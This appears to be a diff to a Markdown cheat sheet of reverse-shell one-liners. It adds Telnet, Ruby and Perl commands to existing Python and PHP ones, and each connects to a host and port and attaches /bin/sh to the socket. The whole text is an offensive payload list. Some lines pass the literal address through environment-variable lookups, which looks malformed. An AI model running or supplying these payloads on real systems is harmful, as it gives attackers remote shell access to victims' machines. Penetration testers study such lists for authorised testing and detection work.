@@ -79,3 +79,12 @@ python -c 'import sys,socket,os,pty;s=socket.socket()
 
 ### Reverse shell > <a name="reverse_shell_php"></a>PHP
 ###### php -r '$sock=fsockopen(getenv("127.0.0.1"),getenv("1234"));exec("/bin/sh -i <&3 >&3 2>&3");'
+
+### Reverse shell > <a name="reverse_shell_telnet"></a>Telnet
+###### TF=$(mktemp -u); mkfifo $TF && telnet 127.0.0.1 1234 0<$TF | /bin/sh 1>$TF
+
+### Reverse shell > <a name="reverse_shell_ruby"></a>Ruby
+###### ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["127.0.0.1"],ENV["1234"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+### Reverse shell > <a name="reverse_shell_perl"></a>Perl
+###### perl -e 'use Socket;$i="$ENV{127.0.0.1}";$p=$ENV{1234};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
